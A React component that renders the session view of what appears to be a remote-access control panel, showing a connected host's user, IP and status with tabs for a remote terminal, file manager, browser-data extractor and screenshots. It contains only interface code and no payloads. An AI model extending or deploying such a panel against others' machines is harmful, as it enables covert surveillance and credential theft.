import React, { useState } from 'react';
import styled, { keyframes } from 'styled-components';
import {
  FiArrowLeft,
  FiTerminal,
  FiFolder,
  FiCamera,
  FiShield
} from 'react-icons/fi';
import { FaWindows, FaLinux } from 'react-icons/fa';

import Terminal from './Terminal';
import FileManager from './FileManager';
import Screenshots from './Screenshots';
import BrowserExtractor from './BrowserExtractor';

const fadeIn = keyframes`
  from { opacity: 0; transform: translateY(8px); }
  to { opacity: 1; transform: translateY(0); }
`;

const Page = styled.div`
  animation: ${fadeIn} 0.4s ease-out;
  display: flex;
  flex-direction: column;
  min-height: calc(100vh - 104px);
  gap: 0;
`;

const TopBar = styled.div`
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 20px;
  flex-wrap: wrap;
  padding-bottom: 18px;
  border-bottom: 1px solid #2a3140;
`;

const Left = styled.div`
  display: flex;
  align-items: center;
  gap: 16px;
  min-width: 0;
`;

const BackButton = styled.button`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  padding: 9px 12px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  font-family: inherit;
  font-weight: 500;
  transition: border-color 0.15s, color 0.15s;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const Identity = styled.div`
  min-width: 0;

  .name-row {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 4px;
  }

  .os {
    width: 28px;
    height: 28px;
    border-radius: 7px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    background: ${props => props.$os === 'windows' ? 'rgba(0, 120, 212, 0.2)' : 'rgba(255, 107, 53, 0.18)'};
    color: ${props => props.$os === 'windows' ? '#4da3ff' : '#ff8f5c'};
    font-size: 14px;
  }

  .name {
    font-family: 'Syne', system-ui, sans-serif;
    font-size: 24px;
    font-weight: 700;
    letter-spacing: -0.03em;
    color: #eef1f6;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .meta {
    color: #8b93a7;
    font-size: 13px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
`;

const Status = styled.span`
  display: inline-flex;
  align-items: center;
  gap: 8px;
  font-size: 12px;
  font-weight: 600;
  color: ${props => props.$on ? '#5ddea0' : '#ff6b7a'};
  padding-bottom: 4px;

  &::before {
    content: '';
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: currentColor;
  }
`;

const Tabs = styled.div`
  display: flex;
  gap: 4px;
  margin-top: 14px;
  border-bottom: 1px solid #2a3140;
`;

const Tab = styled.button`
  background: none;
  border: none;
  border-bottom: 2px solid ${props => props.$active ? '#c6f23e' : 'transparent'};
  color: ${props => props.$active ? '#c6f23e' : '#8b93a7'};
  padding: 12px 16px;
  margin-bottom: -1px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  font-family: inherit;
  font-weight: ${props => props.$active ? 600 : 500};
  transition: color 0.15s;

  &:hover {
    color: #c6f23e;
  }
`;

const Content = styled.div`
  flex: 1;
  min-height: 0;
  margin-top: 18px;
  display: flex;
  flex-direction: column;
  height: calc(100vh - 220px);
  max-height: calc(100vh - 220px);
  overflow: hidden;

  > * {
    flex: 1;
    min-height: 0;
    max-height: 100%;
  }
`;

const SessionView = ({ session, onBack, socket }) => {
  const [activeTab, setActiveTab] = useState('terminal');

  if (!session) {
    return (
      <Page>
        <div style={{ color: '#8b93a7', padding: '40px 0' }}>No session selected</div>
      </Page>
    );
  }

  const getOSType = (client) => {
    if (client.os?.toLowerCase().includes('linux') || client.os === 'darwin') return 'linux';
    return 'windows';
  };

  const osType = getOSType(session);
  const OSIconComponent = osType === 'windows' ? FaWindows : FaLinux;

  const tabs = [
    { id: 'terminal', label: 'Terminal', icon: FiTerminal },
    { id: 'files', label: 'Files', icon: FiFolder },
    { id: 'browser', label: 'Browser', icon: FiShield },
    { id: 'screenshots', label: 'Screenshots', icon: FiCamera }
  ];

  const renderContent = () => {
    switch (activeTab) {
      case 'terminal':
        return <Terminal client={session} socket={socket} />;
      case 'files':
        return <FileManager client={session} socket={socket} />;
      case 'browser':
        return <BrowserExtractor client={session} socket={socket} />;
      case 'screenshots':
        return <Screenshots client={session} socket={socket} />;
      default:
        return <Terminal client={session} socket={socket} />;
    }
  };

  const sessionName = (() => {
    try {
      const names = JSON.parse(localStorage.getItem('sessionNames') || '{}');
      return names[session.id] || session.hostname;
    } catch {
      return session.hostname;
    }
  })();

  return (
    <Page>
      <TopBar>
        <Left>
          <BackButton onClick={onBack}>
            <FiArrowLeft />
            Back
          </BackButton>
          <Identity $os={osType}>
            <div className="name-row">
              <div className="os"><OSIconComponent /></div>
              <div className="name">{sessionName}</div>
            </div>
            <div className="meta">
              {session.username}@{session.ip} · {session.hostname} · {new Date(session.lastSeen || session.connectedAt).toLocaleString()}
            </div>
          </Identity>
        </Left>
        <Status $on={!!session.active}>
          {session.active ? 'Connected' : 'Offline'}
        </Status>
      </TopBar>

      <Tabs>
        {tabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <Tab
              key={tab.id}
              $active={activeTab === tab.id}
              onClick={() => setActiveTab(tab.id)}
            >
              <Icon size={14} />
              {tab.label}
            </Tab>
          );
        })}
      </Tabs>

      <Content>
        {renderContent()}
      </Content>
    </Page>
  );
};

export default SessionView;
